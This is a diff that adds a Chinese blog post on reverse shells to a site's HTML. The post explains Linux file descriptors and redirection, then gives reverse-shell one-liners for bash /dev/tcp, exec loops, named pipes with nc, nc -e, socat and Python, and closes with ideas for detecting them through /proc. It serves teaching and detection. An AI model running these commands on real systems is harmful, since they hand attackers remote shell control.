@@ -156,6 +156,151 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-反弹Shell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/">反弹Shell</a>
+    </h1>
+  
+
+        
+        <a href="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/" class="archive-article-date">
+  	<time datetime="2021-09-18T01:21:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-18</time>
+</a>
+        
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a><em>0x00 引言</em></h3><p>&emsp;&emsp;在一套完整的攻击流程中，反弹Shell是非常关键的一步，攻击者可以借此获取受害机器的文件系统控制权。本文介绍常见的几种反弹Shell方法，以及提供一些简单的检测反弹的思路。</p>
+<h3 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a><em>0x01 基础知识</em></h3><p>&emsp;&emsp;在开始之前需要先理解什么是反弹Shell，以及学会如何甄别受害机器的特征。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 反弹Shell流程</span><br><span class="line">2 文件描述符</span><br><span class="line">3 重定向</span><br><span class="line">4 查看受害机器的连接状态</span><br></pre></td></tr></table></figure>
+<p><strong><em>1、反弹Shell流程</em></strong><br>&emsp;&emsp;假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。但是在某些情况下，正向连接可能会被阻止，比如防火墙屏蔽。为了解决这个问题，便衍生出了反弹Shell的方法。<br>&emsp;&emsp;反弹Shell，即攻击者指定服务端并开启某端口监听，受害者主机主动连接攻击者的服务端程序。</p>
+<p><strong><em>2、文件描述符</em></strong><br>&emsp;&emsp;linux文件描述符可以理解为linux跟踪打开文件而分配的一个数字句柄，这个数字本质上是一个文件句柄，通过句柄就可以实现文件的读写操作。进程启动后再打开新的文件，描述符会自动依次增加。每一个新进程都会继承其父进程的文件描述符，因此所有的shell命令（本质上也是启动新进程），都会默认有三个文件描述符，即标准输入、标准输出、标准错误输出符号。查看文件描述符的方法是:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ll /proc/<span class="string">&#x27;进程PID&#x27;</span>/fd</span><br><span class="line">$ ls -lah /proc/<span class="string">&#x27;进程PID&#x27;</span>/fd</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 13:46 0 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 13:46 1 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 13:46 2 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;0代表标准输入，1代表标准输出，2代表标准错误输出。默认情况下其都指向/dev/pts/1这个设备(/dev/tty/0代表终端0，/dev/pts/1代表远程终端1，具体区别<a target="_blank" rel="noopener" href="https://blog.csdn.net/mountzf/article/details/51735691">查看文献</a><sup>[1]</sup>)。</p>
+<p><strong><em>3、重定向</em></strong><br>&emsp;&emsp;Linux支持将标准的输入输出重新指定到其他文件、socket号或者pipe管道上，这里介绍如何进行文件描述符重定向:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入重定向 - &lt;</span></span><br><span class="line"><span class="comment"># 0可以省略</span></span><br><span class="line">$ cat 0&lt; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line">$ cat &lt; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line"><span class="string">&#x27; 重定向后的文件描述符</span></span><br><span class="line"><span class="string">0 -&gt; &#x27;</span>XXX.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">1 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">2 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出重定向 - &gt;</span></span><br><span class="line"><span class="comment"># 默认为标准输出</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;123&quot;</span> &gt; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;123&quot;</span> 1&gt; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line"><span class="string">&#x27; 重定向后的文件描述符</span></span><br><span class="line"><span class="string">0 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">1 -&gt; &#x27;</span>XXX.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="comment"># 也可以改为标准错误输出</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;123&quot;</span> 2&gt; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line"><span class="string">&#x27; 重定向后的文件描述符</span></span><br><span class="line"><span class="string">0 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">1 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">2 -&gt; &#x27;</span>XXX.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 标准输出与标准错误输出重定向(下面3种形式完全等价)</span></span><br><span class="line">$ ls &gt;&amp; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line">$ ls &amp;&gt; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line">$ ls &gt; <span class="string">&#x27;XXX.txt&#x27;</span> 2&gt; &amp;1 <span class="comment"># 将标准输出给txt文件,同时将标准错误输出到标准输入设备上</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入重定向到指定设备</span></span><br><span class="line">$ cat &lt; &amp;5 <span class="comment"># 输入重定向到文件描述符5所指向的设备</span></span><br></pre></td></tr></table></figure>
+
+<p><strong><em>4、查看受害机器的连接状态</em></strong>  </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定位测试的可疑进程PID</span></span><br><span class="line">$ netstat -natp |grep <span class="string">&#x27;劫持的端口号&#x27;</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ ps -ef |grep <span class="string">&#x27;反弹shell命令&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据PID号查看其文件描述符</span></span><br><span class="line"><span class="comment"># 0、1、2 即为标准文件描述符，562245代表socket连接号</span></span><br><span class="line">$ ll /proc/<span class="string">&#x27;PID号&#x27;</span>/fd</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 22 18:17 0 -&gt; /dev/pts/18</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 22 18:17 1 -&gt; /dev/pts/18</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 22 18:17 2 -&gt; /dev/pts/18</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 22 18:17 255 -&gt; /dev/pts/18</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看socket连接状态</span></span><br><span class="line"><span class="comment"># 本地IP:端口为5126320A:0016，将16进制转为10进制，即为81 38 50 10:22，即10.50.38.81:22</span></span><br><span class="line"><span class="comment"># 远程IP:端口为3B1C140A:C9E1，将16进制转为10进制，即为59 28 20 10:51681，即10.20.28.59:51681</span></span><br><span class="line"><span class="comment"># socket连接号为562245</span></span><br><span class="line">$ cat /proc/net/tcp |grep 562245</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                     </span></span><br><span class="line"><span class="string">14: 5126320A:0016 3B1C140A:C9E1 01 00000000:00000000 02:0008870C 00000000     0        0 562245 2 000000005eb7a0ef 22 5 1 17 -1</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看终端中正在运行的进程</span></span><br><span class="line">$ ps -t 1</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ ps -a</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">  PID TTY          TIME CMD</span></span><br><span class="line"><span class="string">27306 pts/1    00:00:00 bash</span></span><br><span class="line"><span class="string">29585 pts/1    00:00:00 cat</span></span><br><span class="line"><span class="string">29586 pts/1    00:00:00 bash</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-常见方法"><a href="#0x02-常见方法" class="headerlink" title="0x02 常见方法"></a><em>0x02 常见方法</em></h3><p>&emsp;&emsp;在以下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/12038070.html">方法</a><sup>[2]</sup>中，攻击端大部分均使用nc工具开启端口监听(特殊的攻击端会在特定方法中描述):</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -l 监听模式</span></span><br><span class="line"><span class="comment"># -v 输出交互或错误信息</span></span><br><span class="line"><span class="comment"># -p 本地端口</span></span><br><span class="line">$ nc -lvp <span class="string">&#x27;监听端口&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;且在一个正常的nc服务运行流程中，客户端终端的标准输入输出应该是不会被篡改的，其流程图如下:  </p>
+<div align="center">
+<img src="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/正常流程.png">
+<div align="left">   
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1 内置命令</span><br><span class="line">  1.1 bash直接重定向</span><br><span class="line">  1.2 <span class="built_in">exec</span>添加描述符重定向</span><br><span class="line">  1.3 管道文件</span><br><span class="line">  1.4 匿名双管道</span><br><span class="line">2 第三方工具</span><br><span class="line">  2.1 nc</span><br><span class="line">  2.2 socat</span><br><span class="line">  2.3 python</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>1、内置命令</em></strong><br>&emsp;&emsp;以下几种方法使用Linux内置命令，不需要另外安装工具。  </p>
+<p><strong><em>1.1、bash直接重定向</em></strong>  </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line">$ bash -i &gt;&amp; /dev/tcp/<span class="string">&#x27;监听IP&#x27;</span>/<span class="string">&#x27;监听端口&#x27;</span> 0&gt;&amp;1</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ bash -i &gt;&amp; /dev/tcp/<span class="string">&#x27;监听IP&#x27;</span>/<span class="string">&#x27;监听端口&#x27;</span> &lt;&amp;2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 16:16 0 -&gt; socket:[1205356]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 16:16 1 -&gt; socket:[1205356]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 16:16 2 -&gt; socket:[1205356]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;使用bash是最简单直接的反弹Shell方法，其原理是将一个终端进程的标准输入输出以及标准错误输出全部重定向到某个socket连接上，实现流程图如下:  </p>
+<div align="center">
+<img src="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/Bash.png">
+<div align="left">  
+
+<p><strong><em>1.2、exec添加描述符重定向</em></strong>  </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/<span class="string">&#x27;监听IP&#x27;</span>/<span class="string">&#x27;监听端口&#x27;</span>;cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 13:48 0 -&gt; /dev/pts/17</span></span><br><span class="line"><span class="string">l-wx------ 1 root root 64 Sep 18 13:48 1 -&gt; /dev/pts/17</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 13:48 2 -&gt; /dev/pts/17</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 13:48 255 -&gt; /dev/pts/17</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 13:48 5 -&gt; socket:[41567]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;exec命令可以指定一个大于3的文件描述符作为文件的句柄，由于重定向了标准输入输出到大于3的描述符，因此会多产生一个255的文件描述符(在不同终端内，该描述符数字不同)。<a target="_blank" rel="noopener" href="https://blog.csdn.net/worldchinalee/article/details/104049141">while read line句式</a><sup>[3]</sup>能逐行读取输出并将其赋值给line变量，继而在do done内部实现对变量的操作，下面详细分析实现原理:  </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将远程连接socket的句柄用文件描述符5来表示</span></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/<span class="string">&#x27;监听IP&#x27;</span>/<span class="string">&#x27;监听端口&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将从socket句柄传来的字符串输出</span></span><br><span class="line">cat &lt;&amp;5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐行读取符号5中传来的命令，并赋值给line变量</span></span><br><span class="line">|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> XXX;<span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行line字符串的指令并将标准输入输出以及错误输出重定向到文件描述符5指向的socket</span></span><br><span class="line"><span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>1.3、管道文件</em></strong>  </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line">mknod backpipe p; nc <span class="string">&#x27;监听IP&#x27;</span> <span class="string">&#x27;监听端口&#x27;</span> &lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">lr-x------ 1 root root 64 Sep 17 16:19 0 -&gt; /root/backpipe</span></span><br><span class="line"><span class="string">l-wx------ 1 root root 64 Sep 17 16:19 1 -&gt; pipe:[1339090]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 16:19 2 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 16:19 3 -&gt; socket:[1339092]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 16:19 5 -&gt; socket:[564686]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;mknod命令能够新建一个管道，上述新建了一个名为backpipe的管道文件。nc与bash均为常驻进程，两个进程间使用匿名管道’|’连接。最终实现了一个单向循环，下面详细分析实现原理:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新建一个管道文件backpipe</span></span><br><span class="line"><span class="comment"># 等价于 mknod -p backpipe</span></span><br><span class="line"><span class="comment"># -p 创建FIFO</span></span><br><span class="line">mknod backpipe p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将nc进程的输出作为bash进程的输入</span></span><br><span class="line">nc <span class="string">&#x27;监听IP&#x27;</span> <span class="string">&#x27;监听端口&#x27;</span> | /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将nc的标准输入修改为backpipe管道</span></span><br><span class="line">nc <span class="string">&#x27;监听IP&#x27;</span> <span class="string">&#x27;监听端口&#x27;</span> &lt;backpipe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将bash进程的标准输出、标准错误输出传递给backpipe管道</span></span><br><span class="line">/bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>
+
+<div align="center">
+<img src="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/管道文件.png">
+<div align="left">  
+
+<p><strong><em>1.4、匿名双管道</em></strong><br>&emsp;&emsp;由于匿名双管道方法的特殊性，攻击端的监听命令需要改变为如下:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 监听命令</span></span><br><span class="line"><span class="comment"># 可自行修改端口</span></span><br><span class="line">ncat -lvvp 7777 <span class="comment"># 或者 nc -lvp 7777</span></span><br><span class="line"><span class="comment"># 监听命令(另开终端)</span></span><br><span class="line"><span class="comment"># 可自行修改端口</span></span><br><span class="line">ncat -lvvp 8888 <span class="comment"># 或者 nc -lvp 8888</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line">nc <span class="string">&#x27;监听IP&#x27;</span> 7777 | /bin/bash | nc <span class="string">&#x27;监听IP&#x27;</span> 8888</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">7777端口</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  17 16:30 0 -&gt; /dev/pts/0</span></span><br><span class="line"><span class="string">l-wx------ 1 root root 64 9月  17 16:30 1 -&gt; pipe:[366671]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  17 16:30 2 -&gt; /dev/pts/0</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  17 16:30 3 -&gt; socket:[366678]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">8888端口</span></span><br><span class="line"><span class="string">lr-x------ 1 root root 64 9月  17 16:30 0 -&gt; pipe:[366673]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  17 16:30 1 -&gt; /dev/pts/0</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  17 16:30 2 -&gt; /dev/pts/0</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  17 16:30 3 -&gt; socket:[366679]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;其原理较为简单， 执行流程图如下:</p>
+<div align="center">
+<img src="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/匿名双管道.png">
+<div align="left">  
+
+<p><strong><em>2、第三方工具</em></strong><br>&emsp;&emsp;使用第三方工具，实际上与内置工具大同小异，其实际的实现方法与上述类似，这边罗列几个典型的工具。  </p>
+<p><strong><em>2.1、nc</em></strong>  </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line"><span class="comment"># 注意，必须使用指定版本的nc工具，否则无效</span></span><br><span class="line">nc -e /bin/sh <span class="string">&#x27;监听IP&#x27;</span> <span class="string">&#x27;监听端口&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong><em>2.2、socat</em></strong>  </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 监听命令</span></span><br><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:<span class="string">&#x27;监听端口&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="string">&#x27;监听IP&#x27;</span>:<span class="string">&#x27;监听端口&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 0 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 1 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 2 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 3 -&gt; socket:[1585844]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 4 -&gt; socket:[1585845]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 5 -&gt; socket:[564686]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 6 -&gt; /dev/ptmx</span></span><br><span class="line"><span class="string">lr-x------ 1 root root 64 Sep 18 10:01 7 -&gt; /var/lib/sss/mc/group</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 8 -&gt; socket:[1585849]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这工具按ctrl+c不会断开连接，而且通过文件描述符比较难辨别，暂时不知道如何探测。</p>
+<p><strong><em>2.3、python</em></strong>  </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line">python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.50.38.176&#x27;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;此种方法使用os的subprocess在本地开启一个子进程，启动bash交互模式，标准输入、标准输出、标准错误输出被重定向到了远程。实质就是Bash直接重定向。</p>
+<h3 id="0x03-检测思路"><a href="#0x03-检测思路" class="headerlink" title="0x03 检测思路"></a><em>0x03 检测思路</em></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 旧的检测方案及其误报原因</span><br><span class="line">2 方案改进</span><br></pre></td></tr></table></figure>
+<p><strong><em>1、旧的检测方案及其误报原因</em></strong><br>&emsp;&emsp;旧的检测方案为检查所有进程的文件描述符，一旦其socket连接号能够在/proc/net/tcp中找到对应的远程连接IP，则会上报反弹Shell攻击。找到两台机器，其误报进程信息如下:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 误报案例一</span></span><br><span class="line"><span class="string">&#x27; /usr/lib/deepin-daemon/uos-license-agent</span></span><br><span class="line"><span class="string">lr-x------ 1 root root 64 9月  18 11:31 0 -&gt; /dev/null</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  18 11:31 1 -&gt; socket:[31915]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  18 11:31 2 -&gt; socket:[31915]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 误报案例二</span></span><br><span class="line"><span class="string">&#x27; /dbappsecurity/rpc_service/rpc_service runservice</span></span><br><span class="line"><span class="string">lr-x------ 1 root root 64 Sep 18 10:22 0 -&gt; /dev/null</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:22 1 -&gt; socket:[27060]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:22 2 -&gt; socket:[27060]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;容易分析，误报原因为标准输入未被劫持，但是标准输出与标准错误输出被劫持，反弹Shell未形成一条链。</p>
+<p><strong><em>2、方案改进</em></strong>  </p>
+<div align="center">
+<img src="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/检测方案.png">
+<div align="left">  
+
